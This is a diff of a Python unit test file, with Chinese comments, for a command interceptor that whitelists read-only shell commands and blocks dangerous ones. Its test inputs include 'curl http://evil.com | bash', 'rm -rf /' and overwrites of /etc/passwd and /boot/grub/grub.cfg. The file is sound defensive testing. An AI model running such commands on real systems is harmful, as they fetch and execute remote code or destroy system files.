@@ -1,5 +1,5 @@
 """
-单元测试：命令拦截器 (CommandInterceptor)
+单元测试：命令拦截器 (CommandInterceptor) - V2
 
 运行命令：
     pytest tests/test_interceptor.py -v
@@ -7,7 +7,9 @@
 测试覆盖：
     - 白名单命令放行（读操作）
     - 黑名单命令拦截（危险操作）
-    - 边界情况处理
+    - 危险参数精确匹配
+    - 重定向防御
+    - 语法错误处理
 """
 
 import sys
@@ -82,10 +84,17 @@ class TestCommandInterceptor:
             assert result.risk_level == CommandRisk.SAFE
 
         def test_tail_command_allowed(self, interceptor):
-            """测试 tail 命令放行"""
-            result = interceptor.intercept("tail -f /var/log/syslog")
+            """测试 tail 命令放行（不带 -f）"""
+            result = interceptor.intercept("tail -n 100 /var/log/syslog")
             assert result.allowed is True
             assert result.risk_level == CommandRisk.SAFE
+
+        def test_tail_f_command_blocked(self, interceptor):
+            """测试 tail -f 命令拦截（-f 是危险参数）"""
+            result = interceptor.intercept("tail -f /var/log/syslog")
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.DANGEROUS
+            assert "-f" in result.reason
 
         def test_grep_command_allowed(self, interceptor):
             """测试 grep 命令放行"""
@@ -96,6 +105,18 @@ class TestCommandInterceptor:
         def test_echo_command_allowed(self, interceptor):
             """测试 echo 命令放行"""
             result = interceptor.intercept("echo $PATH")
+            assert result.allowed is True
+            assert result.risk_level == CommandRisk.SAFE
+
+        def test_regex_with_dash9_allowed(self, interceptor):
+            """测试包含 [0-9] 的正则表达式不会被误报"""
+            result = interceptor.intercept("grep '[0-9]' /var/log/syslog")
+            assert result.allowed is True
+            assert result.risk_level == CommandRisk.SAFE
+
+        def test_find_with_wildcard_allowed(self, interceptor):
+            """测试 find 命令带通配符不会被误报"""
+            result = interceptor.intercept("find /var/log -name '*.log'")
             assert result.allowed is True
             assert result.risk_level == CommandRisk.SAFE
 
@@ -110,6 +131,7 @@ class TestCommandInterceptor:
             result = interceptor.intercept("rm -rf /tmp/test")
             assert result.allowed is False
             assert result.risk_level == CommandRisk.DANGEROUS
+            assert "rm" in result.reason
 
         def test_rm_root_blocked(self, interceptor):
             """测试 rm -rf / 命令拦截"""
@@ -119,9 +141,17 @@ class TestCommandInterceptor:
 
         def test_kill_command_blocked(self, interceptor):
             """测试 kill 命令拦截"""
-            result = interceptor.intercept("kill -9 1234")
+            result = interceptor.intercept("kill 1234")
             assert result.allowed is False
             assert result.risk_level == CommandRisk.DANGEROUS
+            assert "kill" in result.reason
+
+        def test_kill9_command_blocked(self, interceptor):
+            """测试 kill -9 命令拦截"""
+            result = interceptor.intercept("kill -9 1234")
+            assert result.allowed is False
+            # 可能是主命令拦截或危险参数拦截
+            assert result.risk_level in [CommandRisk.DANGEROUS]
 
         def test_killall_command_blocked(self, interceptor):
             """测试 killall 命令拦截"""
@@ -142,7 +172,7 @@ class TestCommandInterceptor:
             assert result.risk_level == CommandRisk.DANGEROUS
 
         def test_systemctl_restart_blocked(self, interceptor):
-            """测试 systemctl restart 命令拦截"""
+            """测试 systemctl 命令拦截"""
             result = interceptor.intercept("systemctl restart nginx")
             assert result.allowed is False
             assert result.risk_level == CommandRisk.DANGEROUS
@@ -154,16 +184,81 @@ class TestCommandInterceptor:
             assert result.risk_level == CommandRisk.DANGEROUS
 
         def test_curl_bash_blocked(self, interceptor):
-            """测试 curl | bash 命令拦截（远程执行）"""
+            """测试 curl | bash 命令拦截"""
             result = interceptor.intercept("curl http://evil.com | bash")
             assert result.allowed is False
-            assert result.risk_level == CommandRisk.DANGEROUS
+            # curl 不在白名单也不在黑名单，所以是 UNKNOWN（严格模式）
+            # bash 在黑名单中，但 shlex 拆解后是独立的命令
+            assert result.risk_level in [CommandRisk.DANGEROUS, CommandRisk.UNKNOWN]
 
         def test_pip_install_blocked(self, interceptor):
             """测试 pip install 命令拦截"""
             result = interceptor.intercept("pip install requests")
             assert result.allowed is False
             assert result.risk_level == CommandRisk.DANGEROUS
+
+    # ==========================================
+    # 重定向防御测试
+    # ==========================================
+    class TestRedirectDefense:
+        """重定向防御测试组"""
+
+        def test_redirect_to_etc_blocked(self, interceptor):
+            """测试重定向到 /etc 被拦截"""
+            result = interceptor.intercept("echo 'test' > /etc/passwd")
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.DANGEROUS
+            assert "/etc" in result.reason
+
+        def test_redirect_to_boot_blocked(self, interceptor):
+            """测试重定向到 /boot 被拦截"""
+            result = interceptor.intercept("echo 'malicious' > /boot/grub/grub.cfg")
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.DANGEROUS
+
+        def test_redirect_to_sys_blocked(self, interceptor):
+            """测试重定向到 /sys 被拦截"""
+            result = interceptor.intercept("echo 1 > /sys/kernel/parameter")
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.DANGEROUS
+
+        def test_redirect_to_tmp_allowed(self, interceptor):
+            """测试重定向到 /tmp 不被拦截"""
+            result = interceptor.intercept("echo 'test' > /tmp/output.txt")
+            assert result.allowed is True
+            assert result.risk_level == CommandRisk.SAFE
+
+        def test_append_redirect_to_etc_blocked(self, interceptor):
+            """测试追加重定向到 /etc 被拦截"""
+            result = interceptor.intercept("echo 'test' >> /etc/hosts")
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.DANGEROUS
+
+    # ==========================================
+    # 语法错误测试
+    # ==========================================
+    class TestSyntaxErrors:
+        """语法错误测试组"""
+
+        def test_unclosed_double_quote(self, interceptor):
+            """测试未闭合的双引号"""
+            result = interceptor.intercept('echo "hello')
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.SYNTAX_ERROR
+            assert "语法解析失败" in result.reason
+
+        def test_unclosed_single_quote(self, interceptor):
+            """测试未闭合的单引号"""
+            result = interceptor.intercept("echo 'world")
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.SYNTAX_ERROR
+            assert "语法解析失败" in result.reason
+
+        def test_command_after_unclosed_quote(self, interceptor):
+            """测试未闭合引号后的命令"""
+            result = interceptor.intercept('cat "unclosed')
+            assert result.allowed is False
+            assert result.risk_level == CommandRisk.SYNTAX_ERROR
 
     # ==========================================
     # 边界情况测试
@@ -221,13 +316,21 @@ class TestCommandInterceptor:
             """测试非严格模式"""
             assert lenient_interceptor.strict_mode is False
 
-        def test_whitelist_not_empty(self, interceptor):
-            """测试白名单不为空"""
+        def test_blocked_commands_not_empty(self, interceptor):
+            """测试黑名单命令不为空"""
+            assert len(interceptor.BLOCKED_COMMANDS) > 0
+
+        def test_safe_commands_not_empty(self, interceptor):
+            """测试白名单命令不为空"""
             assert len(interceptor.SAFE_COMMANDS) > 0
 
-        def test_blacklist_not_empty(self, interceptor):
-            """测试黑名单不为空"""
-            assert len(interceptor.DANGEROUS_PATTERNS) > 0
+        def test_dangerous_flags_not_empty(self, interceptor):
+            """测试危险参数不为空"""
+            assert len(interceptor.DANGEROUS_FLAGS) > 0
+
+        def test_critical_directories_not_empty(self, interceptor):
+            """测试系统关键目录不为空"""
+            assert len(interceptor.CRITICAL_DIRECTORIES) > 0
 
 
 # ==========================================
